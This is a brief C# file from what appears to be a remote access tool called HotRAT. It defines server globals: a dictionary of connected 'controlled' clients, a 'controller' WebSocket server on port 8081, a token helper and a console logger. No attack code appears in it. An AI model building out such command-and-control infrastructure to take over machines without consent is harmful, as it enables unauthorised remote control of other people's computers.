using HotRAT.Server.Configs;
using HotRAT.Server.Models;
using HotRAT.WSServer.Models;
using System.Collections.Concurrent;
using System.Net;

namespace HotRAT.Server
{
    public class Runtimes
    {
        //被控
        public static ConcurrentDictionary<Guid, ClientConnection> _clients = new();
        //主控
        public static WebSocketServer WSserver = new WebSocketServer(IPAddress.Any, 8081);

        public static string Token() => Libs.Auth.TokenModel.Build(ConfigModels.serverConfig.Key);
        public static void CWrite(object msg, ConsoleColor color = ConsoleColor.White, bool IsWS = false)
        {
            if (IsWS)
                msg = $"[WS]{msg}";
            else
                msg = $"[TCP]{msg}";
            Console.ForegroundColor = color;
            Console.WriteLine($"{msg}");
            Console.ResetColor();
        }
    }
}
